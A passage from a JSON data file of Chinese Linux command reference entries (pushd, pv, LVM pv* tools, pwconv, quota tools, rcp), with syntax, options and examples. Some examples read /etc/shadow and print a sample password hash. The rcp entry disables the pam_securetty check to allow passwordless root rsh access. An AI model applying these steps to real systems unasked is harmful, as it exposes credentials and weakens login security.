\n\n```\n-n：只加入目录到堆叠中，不进行cd操作；\n+n：删除从左到右的第n个目录，数字从0开始；\n-n：删除从右到左的第n个目录，数字从0开始；\n```\n\n### 参数  \n\n目录：需要压入堆栈的目录。\n\n### 实例  \n\n```\nroot@Mylinux:/tmp/dir4# pushd /tmp/dir3\n/tmp/dir3 /tmp/dir4 /tmp/dir1 ~\n\nroot@Mylinux:/tmp/dir3# pushd /tmp/dir2\n/tmp/dir2 /tmp/dir3 /tmp/dir4 /tmp/dir1 ~\n\nroot@Mylinux:/tmp/dir2# pushd -1\n/tmp/dir1 ~ /tmp/dir2 /tmp/dir3 /tmp/dir4\n```\n\n注意：最左边表示栈顶，最右边表示栈底。\n\n\n"},{"name":"pv","categoryId":0,"data":"pv\n\u003d\u003d\u003d\n\n显示当前在命令行执行的命令的进度信息，管道查看器。\n\n## 补充说明\n\n**pv命令**  Pipe Viewer 的简称，由Andrew Wood 开发。意思是通过管道显示数据处理进度的信息。这些信息包括已经耗费的时间，完成的百分比(通过进度条显示)，当前的速度，全部传输的数据，以及估计剩余的时间。\n\n## 下载安装\n\n```bash\n# Debian 系的操作系统，如 Ubuntu\nsudo apt-get install pv\n\n# RedHat系的则这样：\nyum install pv\n```\n\n### 语法  \n\n```bash\npv(选项)(参数)\npv [OPTION] [FILE]...\n```\n\n### 选项  \n\n```\n-p, --progress           show progress bar\n-t, --timer              show elapsed time\n-e, --eta                show estimated time of arrival (completion)\n-I, --fineta             show absolute estimated time of arrival\n                         (completion)\n-r, --rate               show data transfer rate counter\n-a, --average-rate       show data transfer average rate counter\n-b, --bytes              show number of bytes transferred\n-T, --buffer-percent     show percentage of transfer buffer in use\n-A, --last-written NUM   show NUM bytes last written\n-F, --format FORMAT      set output format to FORMAT\n-n, --numeric            输出百分比\n-q, --quiet              do not output any transfer information at all\n\n-W, --wait               display nothing until first byte transferred\n-D, --delay-start SEC    display nothing until SEC seconds have passed\n-s, --size SIZE          set estimated data size to SIZE bytes\n-l, --line-mode          count lines instead of bytes\n-0, --null               lines are null-terminated\n-i, --interval SEC       update every SEC seconds\n-w, --width WIDTH        assume terminal is WIDTH characters wide\n-H, --height HEIGHT      assume terminal is HEIGHT rows high\n-N, --name NAME          prefix visual information with NAME\n-f, --force              output even if standard error is not a terminal\n-c, --cursor             use cursor positioning escape sequences\n\n-L, --rate-limit RATE    limit transfer to RATE bytes per second\n-B, --buffer-size BYTES  use a buffer size of BYTES\n-C, --no-splice          never use splice(), always use read/write\n-E, --skip-errors        skip read errors in input\n-S, --stop-at-size       stop after --size bytes have been transferred\n-R, --remote PID         update settings of process PID\n\n-P, --pidfile FILE       save process ID in FILE\n\n-d, --watchfd PID[:FD]   watch file FD opened by process PID\n\n-h, --help               显示帮助\n-V, --version            显示版本信息\n```\n\n\n### 实例  \n\n我们（在 linux 上使用命令行的用户）的大多数使用场景都会用到的命令是从一个 USB 驱动器拷贝电影文件到你的电脑。如果你使用 cp 来完成上面的任务，你会什么情况都不清楚，直到整个复制过程结束或者出错。\n\n```bash\n# 复制文件会有进度\nlinux [master●] % pv ~/Downloads/CentOS-7-x86_64-Minimal-1511.iso \u003e ~/Desktop/CentOS-7-x86_64-Minimal-1511.iso\n# 下面输入信息\n552MiB 0:00:02 [ 212MiB/s] [\u003d\u003d\u003d\u003d\u003d\u003d\u003d\u003d\u003d\u003d\u003d\u003d\u003d\u003d\u003d\u003d\u003d\u003d\u003e           ] 91% ETA 0:00:00\n\n# -L 可以让你修改 pv 命令的传输速率。\n# 使用 -L 选项来限制传输速率为2MB/s。\npv -L 2m /media/himanshu/1AC2-A8E3/fNf.mkv \u003e ./Desktop/fnf.mkv \n```\n\n\n```bash\n# 字符一个个匀速在命令行中显示出来\necho \"Tecmint[dot]com is a community of Linux Nerds and Geeks\" | pv -qL 10\n\n# 压缩文件展示进度信息\npv /media/himanshu/1AC2-A8E3/fnf.mkv | gzip \u003e ./Desktop/fnf.log.gz \n\n\n# 用 dd 命令将 iso 写入磁盘，pv来实现进度条的显示\nsudo pv -cN source \u003c /Users/kacperwang/Downloads/CentOS-7-x86_64-Everything-1511.iso | sudo dd of\u003d/dev/disk2 bs\u003d4m\n## 显示下面进度\nsource:  5.2GiB 5:11:41 [ 503KiB/s] [\u003d\u003d\u003d\u003d\u003d\u003d\u003d\u003d\u003d\u003d\u003d\u003d\u003d\u003d\u003d\u003d\u003d\u003d\u003d\u003d\u003d\u003e       ] 71% ETA 2:01:56\n```\n\n"},{"name":"pvchange","categoryId":0,"data":"pvchange\n\u003d\u003d\u003d\n\n修改物理卷属性\n\n## 补充说明\n\n**pvchange命令** 允许管理员改变物理卷的分配许可。如果物理卷出现故障，可以使用pvchange命令禁止分配物理卷上的PE。\n\n### 语法  \n\n```\npvchange(选项)(参数)\n```\n\n### 选项  \n\n```\n-u：生成新的UUID；\n-x：是否允许分配PE。\n```\n\n### 参数  \n\n物理卷：指定要修改属性的物理卷所对应的设备文件。\n\n### 实例  \n\n使用pvchange命令禁止分配指定物理卷上的PE。在命令行中输入下面的命令：\n\n```\npvchange -x n /dev/sdb1     #禁止分配\"/dev/sdb1\"上的PE\n```\n\n输出信息如下：\n\n```\nPhysical volume \"/dev/sdb1\" changed  \n1 physical volume changed / 0 physical volumes not changed\n```\n\n\n"},{"name":"pvck","categoryId":0,"data":"pvck\n\u003d\u003d\u003d\n\n检测物理卷的LVM元数据的一致性\n\n## 补充说明\n\n**pvck命令** 用来检测物理卷的LVM元数据的一致性。默认情况下，物理卷中的前4个扇区保存着LVM卷标，可以使用`--labelsector`选项指定其他的位置（例如：数据恢复时）。\n\n### 语法  \n\n```\npvck(选项)(参数)\n```\n\n### 选项  \n\n```\n-d：调试模式；\n-v：详细信息模式；\n--labelsector：指定LVE卷标所在扇区。\n```\n\n### 参数  \n\n物理卷：指定要检查的物理卷对应的设备文件。\n\n### 实例  \n\n使用pvck命令检查物理卷`/dev/sdb1`。在命令行中输入下面的命令：\n\n```\npvck -v /dev/sdb1    #检查物理卷元数据\nScanning /dev/sdb1  \nFound label on /dev/sdb1, sector 1, type\u003dLVM2 001  \nFound text metadata area: offset\u003d4096, size\u003d192512 \nFound LVM2 metadata record at offset\u003d125952,  \nsize\u003d70656, offset2\u003d0 size2\u003d0\n```\n\n\n"},{"name":"pvcreate","categoryId":0,"data":"pvcreate\n\u003d\u003d\u003d\n\n将物理硬盘分区初始化为物理卷\n\n## 补充说明\n\n**pvcreate命令** 用于将物理硬盘分区初始化为物理卷，以便LVM使用。\n\n### 语法  \n\n```\npvcreate(选项)(参数)\n```\n\n### 选项  \n\n```\n-f：强制创建物理卷，不需要用户确认；\n-u：指定设备的UUID；\n-y：所有的问题都回答“yes”；\n-Z：是否利用前4个扇区。\n```\n\n### 参数  \n\n物理卷：指定要创建的物理卷对应的设备文件名。\n\n### 实例  \n\n查看磁盘信息：\n\n```\n[root@localhost ~]# fdisk -l\nDisk /dev/hda: 41.1 GB, 41174138880 bytes\n255 heads, 63 sectors/track, 5005 cylinders\nUnits \u003d cylinders of 16065 * 512 \u003d 8225280 bytes\n\n   Device Boot      Start         End      Blocks   id  System\n/dev/hda1   *           1          13      104391   83  Linux\n/dev/hda2              14        1288    10241437+  83  Linux\n/dev/hda3            1289        1925     5116702+  83  Linux\n/dev/hda4            1926        5005    24740100    5  Extended\n/dev/hda5            1926        2052     1020096   82  Linux swap / Solaris\n/dev/hda6            2053        2235     1469916   8e  Linux LVM\n/dev/hda7            2236        2418     1469916   8e  Linux LVM\n/dev/hda8            2419        2601     1469916   8e  Linux LVM\n/dev/hda9            2602        2784     1469916   8e  Linux LVM\n\n```\n\n检查有无 PV 在系统上，然后将`/dev/hda6`到`/dev/hda9`建立成为PV格式\n\n```\n[root@localhost ~]# pvscan\nNo matching physical volumes found    #找不到任何的 PV 存在！\n```\n\n将6-9分区转成pv，注意大括号的用途：\n\n```\n[root@localhost ~]# pvcreate /dev/hda{6,7,8,9}\n  Physical volume \"/dev/hda6\" successfully created\n  Physical volume \"/dev/hda7\" successfully created\n  Physical volume \"/dev/hda8\" successfully created\n  Physical volume \"/dev/hda9\" successfully created\n```\n\n这就分別表示每个 PV 的信息与系统所有 PV 的信息：\n\n```\n[root@localhost ~]# pvscan\n  PV /dev/hda6         lvm2 [1.40 GB]\n  PV /dev/hda7         lvm2 [1.40 GB]\n  PV /dev/hda8         lvm2 [1.40 GB]\n  PV /dev/hda9         lvm2 [1.40 GB]\n  Total: 4 [5.61 GB] / in use: 0 [0   ] / in no VG: 4 [5.61 GB]\n```\n\n更详细的列示出系统上面每个 PV 信息：\n\n```\n[root@localhost ~]# pvdisplay\n  \"/dev/hda6\" is a new physical volume of \"1.40 GB\"\n  --- NEW Physical volume ---\n  PV Name               /dev/hda6  #实际的 partition 分区名称\n  VG Name                          #因为尚未分配出去，所以空白！\n  PV Size               1.40 GB    #就是容量说明\n  Allocatable           NO         #是否已被分配，结果是 NO\n  PE Size (KByte)       0          #在此 PV 內的 PE 大小\n  Total PE              0          #共分割出几个 PE\n  free PE               0          #沒被 LV 用掉的 PE\n  Allocated PE          0          #尚可分配出去的 PE 数量\n  PV UUID               Z13Jk5-RCls-UJ8B-HzDa-Gesn-atku-rf2biN\n....(底下省略)....\n```\n\n删除物理卷：\n\n```\n[root@localhost ~]# pvremove /dev/sdb2\nLabels on physical volume \"/dev/sdb2\" successfully wiped\n\n```\n\n修改物理卷属性：\n\n```\n[root@localhost ~]# pvchange -x n /dev/sdb1    #禁止分配指定物理卷上的PE\nPhysical volume \"/dev/sdb1\" changed  \n1 physical volume changed / 0 physical volumes not changed \n```\n\n\n"},{"name":"pvdisplay","categoryId":0,"data":"pvdisplay\n\u003d\u003d\u003d\n\n显示物理卷的属性\n\n## 补充说明\n\n**pvdisplay命令** 用于显示物理卷的属性。pvdisplay命令显示的物理卷信息包括：物理卷名称、所属的卷组、物理卷大小、PE大小、总PE数、可用PE数、已分配的PE数和UUID。\n\n### 语法  \n\n```\npvdisplay(选项)(参数)\n```\n\n### 选项  \n\n```\n-s：以短格式输出；\n-m：显示PE到LE的映射。\n```\n\n### 参数  \n\n物理卷：要显示的物理卷对应的设备文件名。\n\n### 实例  \n\n使用pvdisplay命令显示指定的物理卷的基本信息。在命令行中输入下面的命令：\n\n```\n[root@localhost ~]# pvdisplay /dev/sdb1    #显示物理卷基本信息\n```\n\n输出信息如下：\n\n```\n\"/dev/sdb1\" is a new physical volume of \"101.94 MB\"  \n--- NEW Physical volume ---  \nPV Name               /dev/sdb1  \n....省略部分输出内容......  \nPV UUID         FOXiS2-Ghaj-Z0Mf- cdVZ-pfpk- dP9p-ifIZXN\n```\n\n\n"},{"name":"pvremove","categoryId":0,"data":"pvremove\n\u003d\u003d\u003d\n\n删除一个存在的物理卷\n\n## 补充说明\n\n**pvremove命令** 用于删除一个存在的物理卷。使用pvremove指令删除物理卷时，它将LVM分区上的物理卷信息删除，使其不再被视为一个物理卷。\n\n### 语法  \n\n```\npvremove(选项)(参数)\n```\n\n### 选项  \n\n```\n-d：调试模式；\n-f：强制删除；\n-y：对提问回答“yes”。\n```\n\n### 参数  \n\n物理卷：指定要删除的物理卷对应的设备文件名。\n\n### 实例  \n\n使用pvremove指令删除物理卷`/dev/sdb2`。在命令行中输入下面的命令：\n\n```\npvremove /dev/sdb2 #删除物理卷\nLabels on physical volume \"/dev/sdb2\" successfully wiped\n\n```\n\n\n"},{"name":"pvs","categoryId":0,"data":"pvs\n\u003d\u003d\u003d\n\n输出物理卷信息报表\n\n## 补充说明\n\n**pvs命令** 用于输出格式化的物理卷信息报表。使用pvs命令仅能得到物理卷的概要信息，如果要得到更加详细的信息可以使用pvdisplay命令。\n\n### 语法  \n\n```\npvs(选项)(参数)\n```\n\n### 选项  \n\n```\n--noheadings：不输出标题头；\n--nosuffix：不输出空间大小的单位。\n```\n\n### 参数  \n\n物理卷：要显示报表的物理卷列表。\n\n### 实例  \n\n使用pvs命令显示系统中所有物理卷的信息报表。在命令行中输入下面的命令：\n\n```\npvs                    #输出物理卷信息报表 \n```\n\n输出信息如下：\n\n```\nPV         VG     fmt  Attr PSize   PFree  \n/dev/sdb1  vg1000 lvm2 --   100.00M 100.00M  \n/dev/sdb2         lvm2 --   101.98M 101.98M\n```\n\n\n"},{"name":"pvscan","categoryId":0,"data":"pvscan\n\u003d\u003d\u003d\n\n扫描系统中所有硬盘的物理卷列表\n\n## 补充说明\n\n**pvscan命令** 会扫描系统中连接的所有硬盘，列出找到的物理卷列表。使用pvscan命令的`-n`选项可以显示硬盘中的不属于任何卷组的物理卷，这些物理卷是未被使用的。\n\n### 语法  \n\n```\npvscan(选项)\n```\n\n### 选项  \n\n```\n-d：调试模式；\n-e：仅显示属于输出卷组的物理卷；\n-n：仅显示不属于任何卷组的物理卷；\n-s：短格式输出；\n-u：显示UUID。\n```\n\n### 实例  \n\n使用pvscan命令扫描当前系统中所有硬盘的物理卷，在命令行中输入下面的命令：\n\n```\n[root@localhost ~]# pvscan     #扫描所有硬盘上的物理卷 \n```\n\n输出信息如下：\n\n```\nPV /dev/sdb1         lvm2 [101.94 MB]  \nPV /dev/sdb2         lvm2 [101.98 MB]  \nTotal: 2 [203.92 MB] / in use: 0 [0   ] / in no VG: 2 [203.92  \nMB] \n```\n\n说明：本例中，输出了两个物理卷，它们不属于任何卷组，是可被利用的物理卷。\n\n\n"},{"name":"pwck","categoryId":0,"data":"pwck\n\u003d\u003d\u003d\n\n用来验证系统认证文件内容和格式的完整性\n\n## 补充说明\n\n**pwck命令** 用来验证系统认证文件`/etc/passwd`和`/etc/shadow`的内容和格式的完整性。\n\n### 语法  \n\n```\npwck(选项)(参数)\n```\n\n### 选项  \n\n```\n-q：仅报告错误信息；\n-s：以用户id排序文件“/etc/passwd”和“/etc/shadow”;\n-r：只读方式运行指令。\n```\n\n### 参数  \n\n*   密码文件：指定密码文件的路径；\n*   影子文件：指定影子文件的路径。\n\n### 实例  \n\n```\npwck /etc/passwd\nuser \u0027lp\u0027: directory \u0027/var/spool/lpd\u0027 does not exist\nuser \u0027news\u0027: directory \u0027/var/spool/news\u0027 does not exist\nuser \u0027uucp\u0027: directory \u0027/var/spool/uucp\u0027 does not exist\nuser \u0027www-data\u0027: directory \u0027/var/www\u0027 does not exist\nuser \u0027list\u0027: directory \u0027/var/list\u0027 does not exist\nuser \u0027irc\u0027: directory \u0027/var/run/ircd\u0027 does not exist\nuser \u0027gnats\u0027: directory \u0027/var/lib/gnats\u0027 does not exist\nuser \u0027nobody\u0027: directory \u0027/nonexistent\u0027 does not exist\nuser \u0027syslog\u0027: directory \u0027/home/syslog\u0027 does not exist\nuser \u0027couchdb\u0027: directory \u0027/var/lib/couchdb\u0027 does not exist\nuser \u0027speech-dispatcher\u0027: directory \u0027/var/run/speech-dispatcher\u0027 does not exist\nuser \u0027usbmux\u0027: directory \u0027/home/usbmux\u0027 does not exist\nuser \u0027haldaemon\u0027: directory \u0027/var/run/hald\u0027 does not exist\nuser \u0027pulse\u0027: directory \u0027/var/run/pulse\u0027 does not exist\nuser \u0027saned\u0027: directory \u0027/home/saned\u0027 does not exist\nuser \u0027hplip\u0027: directory \u0027/var/run/hplip\u0027 does not exist\npwck：无改变\n```\n\n\n"},{"name":"pwconv","categoryId":4,"data":"pwconv\n\u003d\u003d\u003d\n\n用来开启用户的投影密码\n\n## 补充说明\n\n**pwconv命令** 用来开启用户的投影密码。Linux系统里的用户和群组密码，分别存放在名称为passwd和group的文件中， 这两个文件位于`/etc`目录下。因系统运作所需，任何人都得以读取它们，造成安全上的破绽。投影密码将文件内的密码改存在`/etc`目录下的shadow和gshadow文件内，只允许系统管理者读取，同时把原密码置换为\"x\"字符，有效的强化了系统的安全性。\n\n### 语法  \n\n```\npwconv\n```\n\n### 实例  \n\n```\ncat /etc/passwd | grep test\ntest:x:3001:3001::/home/test:/bin/sh\n```\n\n此时可以发现密码段是x\n\n```\ncat /etc/shadow | grep test\ntest:$6$nYOEWamm$bz07nlv/.RgJufb3FAqJJeULfwybzgxmrWqbk7O4vI0KsT6N.ujrh6dDIUcAJdfjksyuyAFDPIngZeD3cgcf.0:15022:0:99999:7:::\n```\n\n\n"},{"name":"pwd","categoryId":8,"data":"pwd\n\u003d\u003d\u003d\n\n绝对路径方式显示用户当前工作目录\n\n## 补充说明\n\n**pwd命令** 以绝对路径的方式显示用户当前工作目录。命令将当前目录的全路径名称（从根目录）写入标准输出。全部目录使用`/`分隔。第一个`/`表示根目录，最后一个目录是当前目录。执行pwd命令可立刻得知您目前所在的工作目录的绝对路径名称。\n\n### 语法  \n\n```\npwd（选项）\n```\n\n### 选项  \n\n```\n--help：显示帮助信息；\n--version：显示版本信息。\n\n```\n\n### 实例  \n\n```\n[root@localhost ~]# pwd\n/root\n```\n\n\n"},{"name":"pwunconv","categoryId":4,"data":"pwunconv\n\u003d\u003d\u003d\n\n用来关闭用户的投影密码\n\n## 补充说明\n\n**pwunconv命令** 与pwconv功能相反，用来关闭用户的投影密码。它会把密码从shadow文件内，重回存到passwd文件里。\n\n### 语法  \n\n```\npwunconv\n```\n\n### 实例  \n\n```\npwunconv     //关闭影子密码\ncat /etc/passwd | grep test     //发现密码已经在passwd文件中了\ntest:$6$nYOEWamm$bz07nlv/.RgJufb3FAqJJeULfwybzgxmrWqbk7O4vI0KsT6N.ujrh6dDIUcAJdfjksyuyAFDPIngZeD3cgcf.0:3001:3001::/home/test:/bin/sh\n\nls /etc/shadow     //查看影子文件，提示没有这个文件或目录\nls: cannot access /etc/shadow: No such file or directory\n```\n\n\n"},{"name":"quota","categoryId":8,"data":"quota\n\u003d\u003d\u003d\n\n显示磁盘已使用的空间与限制\n\n## 补充说明\n\n**quota命令** 用于显示用户或者工作组的磁盘配额信息。输出信息包括磁盘使用和配额限制。\n\n### 语法  \n\n```\nquota(选项)(参数)\n```\n\n### 选项  \n\n```\n-g：列出群组的磁盘空间限制；\n-q：简明列表，只列出超过限制的部分；\n-u：列出用户的磁盘空间限制；\n-v：显示该用户或群组，在所有挂入系统的存储设备的空间限制；\n-V：显示版本信息。\n```\n\n### 参数  \n\n用户或者工作组：指定要显示的用户或者工作组。\n\n### 实例  \n\n我们可以限制某一群组所能使用的最大磁盘配额，而且可以再限制某一使用者的最大磁盘配额 ，好比做一个收费的应用，vip可以得到空间更大一些。另外，以 Link 的方式，来使邮件可以作为限制的配额（更改`/var/spool/mail` 这个路径），不2，需要重新再规划一个硬盘！直接使用 Link 的方式指向 /home （或者其它已经做好的 quota 磁盘）就可以！这通常是用在原本规划不好，但是却又不想要更动原有主机架构的情况中！\n\n要求：Linux 主机里面主要针对 quser1 及 quser2 两个使用者来进行磁盘配额， 且这两个使用者都是挂在 qgroup 组里面的。每个使用者总共有 50MB 的磁盘空间 (不考虑 inode) 限制！并且 soft limit 为 45 MB；而宽限时间设定为 1 天， 但是在一天之内必须要将多余的文件删除掉，否则将无法使用剩下的空间 ；gquota 这个组考虑最大限额，所以设定为 90 MB！（注意，这样设置的好处是富有弹性，好比现在的邮件服务，那么多用户，承诺给用户每人最大空间为数GB，然而人们不可能每人都会使用那么大的空间，所以邮件服务的总空间，实际上肯定不是注册客户数乘以数GB，否则这样得多大啊。）\n\n```\n[root@localhost ~]# groupadd qgroup\n[root@localhost ~]# useradd -m -g qgroup quser1\n[root@localhost ~]# useradd -m -g qgroup quser2\n[root@localhost ~]# passwd quser1\n[root@localhost ~]# passwd quser2\n[root@localhost ~]# df     \u003d\u003d\u003d\u003e  自己找一个合适的分区来做实验，这里用/disk2\nFilesystem             1K-blocks        Used      Available   Use% Mounted on\n/dev/hda1              5952252   3193292     2451720     57%     /\n/dev/hdb1            28267608       77904   26730604       1%     /disk2\n/dev/hda5              9492644     227252     8775412       3%     /disk1\n\n[root@localhost ~]# vi /etc/fstab\nLABEL\u003d/             /                ext3      defaults                                     1 1\nLABEL\u003d/disk1    /disk1        ext3      defaults                                      1 2\nLABEL\u003d/disk2    /disk2        ext3      defaults,usrquota,grpquota       1 2  \n/dev/hda3         swap         swap     defaults                                     0 0\n```\n\n注意多了`usrquota,grpquota`，在`defaults,usrquota,grpquota`之间都没有空格，务必正确书写。这样就算加入了 quota 的磁盘格式了！不过，由于真正的 quota 在读取的时候是读取`/etc/mtab`这个文件的，而该文件需要重新开机之后才能够以/etc/fstab 的新数据进行改写！所以这个时候可以选择：重新开机 (reboot)。\n\n重新`remount filesystem`来驱动设定值。\n\n```\n[root@localhost ~]# umount /dev/hdb1\n[root@localhost ~]# mount -a\n[root@localhost ~]# grep \u0027/disk2\u0027 /etc/mtab\n/dev/hdb1 /disk2 ext3 rw,usrquota,grpquota 0 0\n```\n\n事实上，也可以利用 mount 的 remount 功能。\n\n```\n[root@localhost ~]# mount -o remount /disk2\n```\n\n这样就已经成功的将 filesystem 的 quota 功能加入。\n\n扫瞄磁盘的使用者使用状况，并产生重要的 aquota.group 与 aquota.user：\n\n```\n[root@localhost ~]# quotacheck -avug\nquotacheck: Scanning /dev/hdb1 [/disk2] done\nquotacheck: Checked 3 directories and 4 files\n\n[root@localhost ~]# ll /disk2\n-rw-------  1 root root  6144 Sep  6 11:44 aquota.group\n-rw-------  1 root root  6144 Sep  6 11:44 aquota.user\n```\n\n使用 quotacheck 就可以轻易的将所需要的数据给他输出了！但奇怪的是，在某些 Linux 版本中，不能够以 aquota.user(group) 来启动quota ，可能是因为旧版 quota 的关系， 所以就另外做了一个 link 文件按来欺骗 quota，这个动作非必要。（主要是学习这个思维很重要）\n\n```\n[root@localhost ~]# cd /disk2\n[root@localhost ~]# ln -s aquota.user quota.user\n[root@localhost ~]# ln -s aquota.group quota.group\n```\n\n启动 quota 的限额：\n\n```\n[root@localhost ~]# quotaon -avug\n/dev/hdb1 [/disk2]: group quotas turned on\n/dev/hdb1 [/disk2]: user quotas turned on    \u003d\u003d\u003d\u003e  看到turned on，才是真的成功！\n```\n\n编辑使用者的可使用空间：\n\n```\n[root@localhost ~]# edquota -u quser1\nDisk quotas for user quser1 (uid 502):\n  Filesystem    blocks    soft    hard   inodes   soft   hard\n  /dev/hdb1           0     45000    50000         0      0      0\n[root@localhost ~]# edquota -p quser1 quser2      \u003d\u003d\u003d\u003e  直接复制给quser2\n```\n\n接下来要来设定宽限时间，还是使用 edquota\n\n```\n[root@localhost ~]# edquota -t\nGrace period before enforcing soft limits for users:\ntime units may be: days, hours, minutes, or seconds\n  Filesystem             Block grace period     Inode grace period\n  /dev/hdb1                     1days                  7days\n```\n\n使用`quota -v`来查询：\n\n```\n[root@localhost ~]# quota -vu quser1 quser2\nDisk quotas for user quser1 (uid 502):\n     Filesystem  blocks   quota      limit   grace   files   quota   limit   grace\n      /dev/hdb1         0    45000    50000                   0       0       0\nDisk quotas for user quser2 (uid 503):\n     Filesystem  blocks   quota      limit   grace   files   quota   limit   grace\n      /dev/hdb1         0    45000    50000                   0       0       0\n```\n\n注意，由于使用者尚未超过45 MB，所以 grace ( 宽限时间 ) 就不会出现。\n\n编辑群组可使用的空间：\n\n```\n[root@localhost ~]# edquota -g qgroup\nDisk quotas for group qgroup (gid 502):\n  Filesystem     blocks       soft       hard    inodes   soft   hard\n  /dev/hdb1            0      80000   90000           0      0      0\n\n[root@localhost ~]# quota -vg qgroup\nDisk quotas for group qgroup (gid 502):\n     Filesystem   blocks    quota      limit      grace    files   quota   limit   grace\n      /dev/hdb1         0     80000   90000                       0        0        0\n```\n\n\n"},{"name":"quotacheck","categoryId":8,"data":"quotacheck\n\u003d\u003d\u003d\n\n检查磁盘的使用空间与限制\n\n## 补充说明\n\n**quotacheck命令** 通过扫描指定的文件系统，获取磁盘的使用情况，创建、检查和修复磁盘配额（quota）文件。执行quotacheck指令，扫描挂入系统的分区，并在各分区的文件系统根目录下产生quota.user和quota.group文件，设置用户和群组的磁盘空间限制。\n\n### 语法  \n\n```\nquotacheck(选项)(参数)\n```\n\n### 选项  \n\n```\n-a：扫描在/etc/fstab文件里，有加入quota设置的分区；\n-d：详细显示指令执行过程，便于排错或了解程序执行的情形；\n-g：扫描磁盘空间时，计算每个群组识别码所占用的目录和文件数目；\n-R：排除根目录所在的分区；\n-u：扫描磁盘空间时，计算每个用户识别码所占用的目录和文件数目；\n-v：显示指令执行过程。\n```\n\n### 参数  \n\n文件系统：指定要扫描的文件系统。\n\n### 实例  \n\n将所有的在`/etc/mtab`内，含有quota支持的partition进行扫描：\n\n```\n[root@linux ~]# quotacheck -avug\nquotacheck: Scanning /dev/hdb1 [/disk2] done\nquotacheck: Checked 3 directories and 4 files\n\n```\n\n强制扫描已挂载的filesystem：\n\n```\n[root@linux ~]# quotacheck -avug -m\n```\n\n\n"},{"name":"quotaoff","categoryId":8,"data":"quotaoff\n\u003d\u003d\u003d\n\n关闭Linux内核中指定文件系统的磁盘配额功能\n\n## 补充说明\n\n**quotaoff命令** 用于关闭Linux内核中指定文件系统的磁盘配额功能。\n\n### 语法  \n\n```\nquotaoff(选项)(参数)\n```\n\n### 选项  \n\n```\n-a：关闭在/etc/fstab文件里，有加入quota设置的分区的空间限制；\n-g：关闭群组的磁盘空间限制；\n-u：关闭用户的磁盘空间限制；\n-v：显示指令执行过程。\n```\n\n### 参数  \n\n文件系统：指定要关闭磁盘配额功能的文件系统。\n\n\n"},{"name":"quotaon","categoryId":8,"data":"quotaon\n\u003d\u003d\u003d\n\n激活Linux内核中指定文件系统的磁盘配额功能\n\n## 补充说明\n\n**quotaon命令** 用于激活Linux内核中指定文件系统的磁盘配额功能。执行quotaon指令可开启用户和群组的才磅秒年空间限制，各分区的文件系统根目录必须有quota.user和quota.group配置文件。\n\n### 语法  \n\n```\nquotaon(选项)(参数)\n```\n\n### 选项  \n\n```\n-a：开启在/ect/fstab文件里，有加入quota设置的分区的空间限制；\n-g：开启群组的磁盘空间限制；\n-u：开启用户的磁盘空间限制；\n-v：显示指令指令执行过程。\n```\n\n### 参数  \n\n文件系统：指定要激活磁盘配额功能的文件系统。\n\n\n"},{"name":"rcconf","categoryId":0,"data":"rcconf\n\u003d\u003d\u003d\n\nDebian Linux下的运行等级服务配置工具\n\n## 补充说明\n\n**rcconf命令** 是Debian Linux下的运行等级服务配置工具，用以设置在特定的运行等级下系统服务的启动配置。\n\n### 语法  \n\n```\nrcconf(选项)\n```\n\n### 选项  \n\n```\n--help：打印帮助信息；\n--dialog：使用对话命令显示菜单；\n--notermcheck：不按照终端属性来设置窗口尺寸。\n```\n\n\n"},{"name":"rcp","categoryId":6,"data":"rcp\n\u003d\u003d\u003d\n\n使在两台Linux主机之间的文件复制操作更简单\n\n## 补充说明\n\n**rcp命令** 使在两台Linux主机之间的文件复制操作更简单。通过适当的配置，在两台Linux主机之间复制文件而无需输入密码，就像本地文件复制一样简单。\n\n### 语法  \n\n```\nrcp(选项)(参数)\n```\n\n### 选项  \n\n```\n-p：保留源文件或目录的属性，包括拥有者、所属群组、权限与时间；\n-r：递归处理，将指定目录下的文件与子目录一并处理；\n-x：加密两台Linux主机间传送的所有信息。\n-D：指定远程服务器的端口号。\n```\n\n同名用户的主目录。如果没有给出远程用户名，就使用当前用户名。如果远程机上的路径包含特殊shell字符，需要用反斜线`\\\\`、双引号`\"\"`或单引号`\u0027\u0027`括起来，使所有的shell元字符都能被远程地解释。需要说明的是，rcp不提示输入口令，它通过rsh命令来执行拷贝。\n\ndirectory 每个文件或目录参数既可以是远程文件名也可以是本地文件名。远程文件名具有如下形式`rname@rhost:path`，其中rname是远程用户名，rhost是远程计算机名，path是这个文件的路径。\n\n### 参数  \n\n源文件：指定要复制的源文件。源文件可以有多个。\n\n### 实例  \n\n **rcp命令使用条件** \n\n如果系统中有`/etc/hosts`文件，系统管理员应确保该文件包含要与之进行通信的远程主机的项。配置过程:\n\n只对root用户生效\n\n1、在双方root用户根目录下建立rhosts文件，并将双方的hostname加进去。在此之前应在双方的`/etc/hosts`文件中加入对方的ip和hostname  \n2、把rsh服务启动起来，redhat默认是不启动的。  \n方法：用执行ntsysv命令，在rsh选项前用空格键选中，确定退出。然后执行`service xinetd restart`即可。  \n3、到`/etc/pam.d/`目录下，把rsh文件中的`auth required /lib/security/pam_securetty.so`一行用“#”注释掉即可。（只有注释掉这一行，才能用root用户登录）\n\n **将当前目录下的 test1 复制到名为 webserver1 的远程系统：** \n\n```\nrcp test1 webserver1:/home/root/test3\n```\n\n在这种情况下，test1 被复制到远程子目录 test3下，名称仍为 test1 。如果仅提供了远程主机名，rcp 将把 test1 复制到远程主目录下，名称仍为 test1 。\n\n **还可以在目的目录中包含文件名。例如，将文件复制到名为 webserver1的系统中：** \n\n```\nrcp test1 webserver1:/home/root/test3\n```\n\n在这种情况下，将 test1 复制到远程目录root 下并将其命名为 test3。\n\n **从远程系统复制文件：要将远程系统中的文件复制到本地目录下：** \n\n```\nrcp remote_hostname:remote_file local_fileEnter\n```\n\n **将远程系统 webserver1中的 test2 复制到当前目录：** \n\n```\nrcp webserver1:/home/root/test2 .Enter\n```\n\n`.`是“当前目录”的简写形式。在这种情况下，远程目录中的 test2 被复制到当前目录下，名称仍为 test2 。\n\n如果希望用新名称复制文件，请提供目标文件名。如果希望将 test2 复制到本地系统中的其他目录下，请使用以下绝对或相对路径名：\n\n```\nrcp webserver1:/home/root/test2 otherdir/ Enter\n```\n\n或者，如果希望用其他文件名将文件复制到其他目录下：\n\n```\nrcp webserver1:/home/root/test2 otherdir/otherfile Enter\n```\n\n **将目录复制到远程系统：** \n\n要将本地目录及其文件和子目录复制到远程系统，请同时使用 rcp 和 -r（递归）选项。\n\n```\nrcp -r local_dir remote_hostname:remote_dir Enter\n```\n\n如果当前目录下没有 local_dir，则除本地目录名外，还需要提供相对路径名（自当前目录开始）或绝对路径名（自 / 顶级目录开始）。另外，如果主目录下没有 